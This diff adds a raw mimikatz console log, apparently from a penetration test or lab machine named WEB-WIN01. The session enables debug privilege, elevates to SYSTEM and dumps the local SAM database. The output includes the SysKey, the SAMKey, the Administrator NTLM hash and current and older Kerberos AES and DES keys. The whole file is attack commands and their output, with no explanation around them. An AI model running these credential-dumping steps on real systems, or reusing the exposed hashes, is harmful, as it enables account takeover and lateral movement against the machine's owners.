@@ -1,0 +1,73 @@
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # token::elevate
+Token Id  : 0
+User name : 
+SID name  : NT AUTHORITY\SYSTEM
+
+556     {0;000003e7} 1 D 36278          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !
+ * Process Token : {0;000003e7} 0 D 1417542     NT AUTHORITY\SYSTEM     S-1-5-18        (12g,10p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 1434627     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz(commandline) # lsadump::sam
+Domain : WEB-WIN01
+SysKey : 908b8788f43a4425cb000861860970e3
+Local SID : S-1-5-21-279593051-708607744-3403857608
+
+SAMKey : 6769002d0925ddf06b5dbf8c0cb36218
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: bdaffbfe64f1fc646a3353be1c2c3c99
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 67dabe73f9a128df16e3b06ff4dac8d3
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WIN-MSALO6CQSURAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 93825828ca405d1c5b433c870b25513745369e6dce832532a1525da12f0a2523
+      aes128_hmac       (4096) : 78c109e5b2100e3a593b53a2998c10c7
+      des_cbc_md5       (4096) : efb0d662b66dfe37
+    OldCredentials
+      aes256_hmac       (4096) : 23cbc0dad348bebcbdbb4c82e9b23af299e8b56de358bafe24f2235f34497e4a
+      aes128_hmac       (4096) : e35eb565af30c8ed79df5d8875508df6
+      des_cbc_md5       (4096) : 4904021983252cd5
+    OlderCredentials
+      aes256_hmac       (4096) : 57f1c79e0c75aa5308b9c8afcce610622a378fcd608ce49aaeabda5e92e578a5
+      aes128_hmac       (4096) : e86a018820c2bf69562a282cdea6d2c0
+      des_cbc_md5       (4096) : 490432b320157c92
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WIN-MSALO6CQSURAdministrator
+    Credentials
+      des_cbc_md5       : efb0d662b66dfe37
+    OldCredentials
+      des_cbc_md5       : 4904021983252cd5
+
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+
+mimikatz(commandline) # exit
